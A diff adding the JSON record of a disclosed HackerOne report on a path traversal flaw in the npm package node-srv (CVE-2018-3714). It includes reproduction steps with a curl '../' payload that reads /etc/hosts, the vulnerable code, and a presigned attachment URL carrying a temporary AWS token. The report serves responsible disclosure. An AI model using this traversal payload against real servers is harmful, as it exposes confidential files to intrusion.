@@ -1,0 +1,141 @@
+{
+  "id": 309124,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkxMjQ=",
+  "url": "https://hackerone.com/reports/309124",
+  "title": "[node-srv] Path Traversal allows to read arbitrary files from remote server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-25T20:00:51.494Z",
+  "submitted_at": "2018-01-25T20:00:51.494Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3714"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-07T15:33:00.365Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-05T15:32:54.196Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**node-srv** contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.\n\n**Module:** \n\nSimple static node.js server. Supports Heroku and Grunt.js\nhttps://www.npmjs.com/package/node-srv\n\n\n**Description**\n\n```node-srv``` does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.\n\n\n\n## Steps To Reproduce:\n\n- install ```node-srv```\n\n```\n$ npm install node-srv\n```\n\n- create simple server:\n\n```javascript\n//Require module \nvar Server = require('node-srv');\n\n// Start server \nvar srv = new Server({\n    port: 8080,\n    root: './',\n    logs: true\n}, function () {\n    console.log('Server stopped');\n});\n```\n\n- run server:\n\n```\n$ node app.js\n```\n\n- visit ```http://127.0.0.1:8080``` to verify if everything is fine.\n\n- now, run following ```curl``` command (please adjust numbers of ../ to your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts\n```\n\nYou should see the content of ```/etc/hosts``` file:\n\n{F257357}\n\n\nThe problem is that url read from the user is not sanitize in any way against classic ```../``` path traversal payload:\n\n\n```javascript\nreturn new Promise((function(_this) {\n        return function(resolve, reject) {\n          var uri;\n          uri = url.parse(req.url);\n          return resolve(uri.pathname);\n        };\n      })(this)).then((function(_this) {\n        return function(pathname) {\n          filePath = pathname;\n          filePath = filePath.replace(/\\/$/, \"/\" + _this.options.index);\n          filePath = filePath.replace(/^\\//, \"\");\n          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);\n          return _this.processRequest(res, filePath);\n        };\n```\n\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 257357,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/357/cc175260921e87d336fdc1722a155babaa20deeb/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQH5ODH6%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T024802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIB5ishT0L4ISixS9cKndP85gVywcTIQmD0QUaidLUQh2AiAlHN82DTQc23w05M3n6LdkyhLQJDlPY3ZU9KpH%2FXAZoiq6BQij%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMz7lQ%2FoRLBcvAFP5ZKo4Ffd2c6njDfzGofRWAynXjl0CmkrrBFUnVTi6kzs4%2FS1A6gKXNb1GY10Kv0yMvvn2jNVp6JWDe%2Bxgm8ueCwNq9qF5O%2Bp7VLjNufvxUfUNxBFH4k2w6v4aODQNFAGWida7tn5NNgUMOQSst7Skv3cMQIkSwvenkUX1c7XGuE9STRaizQ2rHwSL%2BSdkvR8CtOXnlI%2FfnH%2F1ZDAOYrNNfDjN%2FE%2BEACi3vTK175rA7bS%2BWXvDsaJNXJuFCxwr7HRRrxlAGXYzRqGEuBTy36loy%2BJZNNhaAQOlMXWVo7BAU9SmBa7GQ8jZBRrKhvvQSKYnrDftPMJquZn5gXJKdbCBvgcbyra3wFeQwWGzuOoGhsCOdb5y6bIFLmhfHH6kVacuzMcywUatSuOEcJNXfGz6cK2nsPZhaKHX7%2FxFKCSfaSS0aAk8Q%2FRQChQKWQMaiL9CEjKqTeEvvkJ6scbch6dF65c%2B8nRWUR1TavxjL2Qi3ijbn9hb3PtgvB%2FHh2vbiy4INBOe%2FEED6Mz3ZuTq6yT0BhsXrcVO7aZZUStph6T4m1OA3fBtmNfC44L%2FJrxyLYFU%2FeRrzYAr7yXrLy0AuwU4C6A4SVsy1S8M5%2Fi9tW7wobreiHssXaZOrQIJkmrxX8M36VvaZC7mOcPBthLCo14rdBHsND3dfYO9pTC6bjBjKaLSj4Nu7rBnGPKPNrqqNXl0phXFPLdi5QxmijoEY0IpqJ9dJl5I%2FkbwUInGSzkFn4dzLATKxoWW2968CLNTZpgganeiFN7rFepTOqZMjw%2Bfn1p15yZ5tTK0x1dSgwi8eGVY0SRpfeDZz%2FfC2VNpVEF5o2fZJWagPaeNq5dOKqLdKftLMNyEX5SsMJZk62qKWXllJMKac5MwGOrIBv1oTJ2rOItRemWFwQ6l6ggcjW8muXBWSoIg3xV4hOuQ3bMZgDiDFiLC6UT4mjcywfa82DVpSCaqKPJ5Zj8jx%2Fndcb9nSA2fCbO8LON6n087RTosNKDWnwIBF6OTlQpoQQURLaFw9Z4TBcpHTYHtY%2FzrXydLhLtoxMM6f4Fu8tnRoELXwRyBLpl0ddsuEGF0OeWncIW10MIQ3ce96sEVvH3ue4F2Q0EIaeY6cSmi%2FDWrVRQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c318d3a61da3c526aff8e18a2d48209c74752d3309a0d0811f1f6e7d85fc688",
+      "file_size": 2399182,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-07T15:32:54.314Z",
+  "allow_singular_disclosure_after": -251205307.8062526,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "mashoud1122",
+    "whitesector",
+    "eveeez",
+    "khizer47",
+    "khalooda0x",
+    "japz"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5630,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "node-srv",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
